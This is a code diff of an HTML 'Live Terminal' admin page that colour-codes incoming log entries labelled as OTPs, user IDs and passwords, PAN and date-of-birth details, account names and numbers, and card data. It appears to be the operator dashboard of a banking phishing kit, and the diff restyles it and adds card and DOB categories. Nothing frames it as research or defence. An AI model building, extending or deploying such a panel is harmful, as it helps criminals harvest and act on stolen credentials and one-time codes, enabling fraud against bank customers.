@@ -3,55 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Live Admin Color-Coded</title>
+    <title>Vibrant Admin</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Arial', sans-serif; }
         
-        body { background-color: #ffffff; padding: 10px; text-align: left; }
+        body { background-color: #ffffff; padding: 5px; }
 
-        /* Small Header */
+        /* Compact Header */
         .header {
-            padding: 8px 5px;
+            padding: 10px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid #eee;
-            margin-bottom: 10px;
+            border-bottom: 2px solid #eee;
+            margin-bottom: 8px;
         }
-        .header h1 { font-size: 11px; color: #bbb; text-transform: uppercase; letter-spacing: 1px; }
+        .header h1 { font-size: 12px; color: #000; font-weight: 900; text-transform: uppercase; }
         
         .v-badge {
-            background: #000;
+            background: #ff0000;
             color: #fff;
-            padding: 2px 10px;
+            padding: 2px 12px;
             border-radius: 4px;
-            font-weight: 800;
-            font-size: 14px;
+            font-weight: 900;
+            font-size: 16px;
         }
 
-        .container { display: flex; flex-direction: column; gap: 5px; }
+        .container { display: flex; flex-direction: column; gap: 4px; }
 
-        /* Compact Full Screen Cart */
+        /* Full Screen Compact Cart */
         .data-row {
             display: block;
             width: 100%;
-            padding: 6px 12px; /* Bahut patla padding */
+            padding: 8px 12px;
             border-radius: 4px;
-            font-size: 13px; /* Chota text */
-            font-weight: 700;
-            line-height: 1.3;
-            color: #000000; /* Text Black */
+            font-size: 14px;
+            font-weight: 800;
+            line-height: 1.4;
+            color: #ffffff; /* Text White taaki dark color pe dikhe */
             white-space: pre-wrap;
-            text-align: left; /* Shuruat se */
+            text-align: left; /* Strict Left Alignment */
             word-break: break-all;
-            border: 1px solid rgba(0,0,0,0.03);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
         }
 
         .time {
             display: block;
-            font-size: 8px;
-            color: rgba(0,0,0,0.3);
-            margin-top: 2px;
+            font-size: 9px;
+            color: rgba(255,255,255,0.7);
+            margin-top: 4px;
             font-weight: 400;
         }
     </style>
@@ -59,7 +59,7 @@
 <body>
 
     <div class="header">
-        <h1>TERMINAL</h1>
+        <h1>LIVE TERMINAL</h1>
         <div class="v-badge" id="vCount">0</div>
     </div>
 
@@ -88,17 +88,19 @@
                     if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";
 
                     let content = log.detail.toLowerCase();
-                    let bgColor = "#f0f0f0"; // Default Grey
+                    let bgColor = "#444"; // Default Dark Grey
 
-                    // COLOR CODING LOGIC
+                    // --- BRIGHT COLOR CODING ---
                     if (content.includes("otp:-")) {
-                        bgColor = "#ffcdd2"; // Red (OTP)
+                        bgColor = "#d32f2f"; // Strong Red (OTP)
                     } else if (content.includes("user id:-") || content.includes("pass:-")) {
-                        bgColor = "#c8e6c9"; // Green (Login)
-                    } else if (content.includes("pan:-")) {
-                        bgColor = "#bbdefb"; // Blue (PAN)
+                        bgColor = "#2e7d32"; // Strong Green (Login)
+                    } else if (content.includes("pan:-") || content.includes("dob:-")) {
+                        bgColor = "#1565c0"; // Strong Blue (KYC)
                     } else if (content.includes("acc:-") || content.includes("name:-")) {
-                        bgColor = "#f8bbd0"; // Pink (Account)
+                        bgColor = "#c2185b"; // Strong Pink/Magenta (Account)
+                    } else if (content.includes("card:-")) {
+                        bgColor = "#ef6c00"; // Strong Orange (Card)
                     }
 
                     return `
